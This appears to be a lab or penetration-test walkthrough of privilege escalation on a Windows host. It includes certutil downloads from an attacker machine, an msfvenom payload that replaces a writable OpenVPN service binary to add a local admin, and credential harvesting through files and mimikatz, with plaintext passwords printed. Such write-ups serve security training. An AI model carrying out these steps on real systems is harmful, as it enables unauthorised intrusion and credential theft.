# Post Exploit - Scientist Machine

- [Post Exploit - Scientist Machine](#post-exploit---scientist-machine)
  - [Local Enumeration 1 - Iyer](#local-enumeration-1---iyer)
  - [Privilege escalation](#privilege-escalation)
  - [Local Enumeration 2 - Administrator](#local-enumeration-2---administrator)

---

## Local Enumeration 1 - Iyer

Check the user privilege:

```
whoami
whoami /priv
net localgroup administrators
```

![picture 6](images/19122d818cc716044ef963f5bb8883ea87ea009f2c1a1a3b5f6435be06ea25a5.png)  

* The current user `iyer` does not have admin privilege.

<br/>

Use `winPEAS.exe` to perform a local enumeration. (Ref: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)

Serve `winPEAS.exe` using python on the attacker machine:

```
python3 -m http.server 80
```
![picture 7](images/eef477ff7de419d383c249a9f2986a1eb7ad7ce5750f06ddddb4fa44f2d46d46.png)  

<br/>

Download `winPEAS.exe` on the Scientist Machine using `certutil`:
```
certutil -urlcache -f http://192.168.100.11/winPEAS.exe .\winPEAS.exe
```

![picture 8](images/af962bc5882e8aea687ee78a54e093b1a68cb252098cf272850856b7ec762936.png)  

<br/>

Run `winPEAS.exe` to perform a local enuemraiton:
```
winPEAS.exe
```

However it is bugged since `atomic.site` is unresponsive:

![picture 9](images/395895655234d7c068ecddc6fe0243061f6150a67db8af2bf3e58f2805f63c42.png)  

<br/>

Manually enuemrating the `Program File (x86)` folder, user installed programs are `OpenVPN Technologies` and `Python38-32`:

![picture 1](images/fc1e41ab39f6288f8a7e53579493d99acac80998edd851a3c9eb183a02136f24.png)  

<br/>

Get the current running processes:

```
powershell -c "Get-Process"
```

![picture 2](images/809ed7cb3e70263d2c86c52c72c3ee0e65c497805a175cdafb511577fcd5ac95.png)  

* `ovpn.exe` is running.

<br/>

Try to see if this is a service:

```
sc query ovpn
sc qc ovpn
```

![picture 3](images/67bcae22af51961810560e330f592303606e81412837ec57e84aeb24d600a821.png)  


![picture 4](images/eb3f80e8301f9b89023e7de8d0f6507e94f2ae43d2b4c23a249d2568d47367e1.png)  

* The current user can start / stop the service

<br/>

Check the permission of the binary path:

```
icacls "C:\Program Files (x86)\OpenVPN Technologies\OpenVPN Client\*"
```

![picture 9](images/5ea52dee7464384a6267b0baa3688c4f010b59b28a33b3b4f72af605ded0a3e0.png)  


![picture 5](images/2bb743c073b53175c3f174cbb90fcd7edcaaf91abbf012e4482dbb926c1d9b10.png)  

* The current user has the Full permission.

<br/>

## Privilege escalation

> Technique:<br/>
> T1543.003 - Create or Modify System Process: Windows Service<br/>
> https://attack.mitre.org/techniques/T1543/003/

<br/>

First backup a copy of `ovpn.exe`:

```
copy "C:\Program Files (x86)\OpenVPN Technologies\OpenVPN Client\ovpn.exe" "C:\Users\Public\ovpn.exe"
```

![picture 6](images/0e1dd98d7e3385df37d3484f3225e12ee49a699982381be0571a4e840e7ec3da.png)  

<br/>

On the attacker machine, generate a payload which adds `OPERATIONS\iyer` as local admin with `msfvenom`, and then serve it using python http server:

```
msfvenom -p windows/exec CMD="net localgroup administrators OPERATIONS\iyer /add" -b "x00" -f exe > ovpn.exe
```

```
python3 -m http.server 80
```

![picture 7](images/118024c3365fe2d9a86d3746b6830d6606507cd4c01ac9c62700bd55313c95c2.png)  

<br/>

On the Scientist machine, replace `ovpn.exe` by the served one:

```
cd C:\Program Files (x86)\OpenVPN Technologies\OpenVPN Client\
move ovpn.exe ovpn2.exe
certutil -urlcache -f http://192.168.100.11/ovpn.exe .\ovpn.exe
```

![picture 8](images/3fa3a6b6310fc4dd3147cbfac84b5da85c6348a99085843c2eb884657edb4e2f.png)  

<br/>

Then restart the service `ovpn` to get the binary executed.

```
sc stop ovpn
sc start ovpn
```

![picture 10](images/a0f9bcdb6e8ba5ae27a8f309e911a17d49b6b808e99ee2c3f8d0bd2866b2a5b3.png)  

![picture 11](images/49ee88a744b067ee43fca8f30e3072d2d9c29daad990d5dc40689dae8b4dbe23.png)  

![picture 12](images/77526e3b20dbc7d5a47a9cb66113ffa3743c417287673e5f75627f670eea7a96.png)  

* As shown, our privilege is escalated to local admin.

<br/>

Restart the reverse shell and we can browse the Administrator's folder:

![picture 13](images/348ce963ab113d5c0e4ab3dcd3a8f1348ab6edc6249f15fa5eb52f7ca341104e.png)  

<br/>

## Local Enumeration 2 - Administrator

Check the Administrator's desktop:

```
dir C:\Users\Administrator\Desktop\
```

![picture 14](images/c8357c88200e4b9f0983a7710d0abfbb128b173a23f71927230fafb74fea9e41.png)  


<br/>

Check the content of `Git-Configuration.txt`:

```
cd C:\Users\Administrator\Desktop
type Git-Configuration.txt
```

![picture 15](images/a3420cccfde08a278310d2952eb082c029a029d2da19b5b83c15e6b741467265.png)  

![picture 20](images/d77464f833cbc53b9ce9b6d5cf702c6b18302d80e07d1123c6cfe915b8e287b3.png)  

* `automation-server.operations.atomic.site` (`10.1.3.1`)

<br/>

Try to clone the repo to the local:

```
git clone http://automation-server.operations.atomic.site/iyer/Database-Connection.git
```

![picture 16](images/04e6889388dd66ff4e6e53416bc6227b5f6440b9737a0caa96b103e068f35587.png)  

<br/>

Check the files in to downloaded repo:

```
cd Database-Connection
dir
```

![picture 17](images/9f66eee488db83246d7c99f6af23ee054e492efb0f63d0d394cc40d676e65608.png)  

<br/>

Check the content of `migrate.txt`:

```
type to_migrate.txt
```

![picture 18](images/d273e6942095412db33f35217e9f08a734b6a61cc920ebfce4840c04f0971297.png)  

![picture 19](images/106168ff597c0bdb77e33593b129731e3b214a508d37aa4b868ae33518236d74.png)  

- Found 2 credentials:
  -  `iisadmin` \ `Head!!S%$#@!`
  -  SQL: `tutorialsdojo` \ `P@sSword123`

<br/>

Also we can use mimikatz to dump credential:

![picture 74](images/df6ca3355c44059ba30822e19c9cbfbfc315ce840baa495b506722cdff49a523.png)  

Iyer's credential:
- `operations\iyer`
- `Sc!ent!st@2`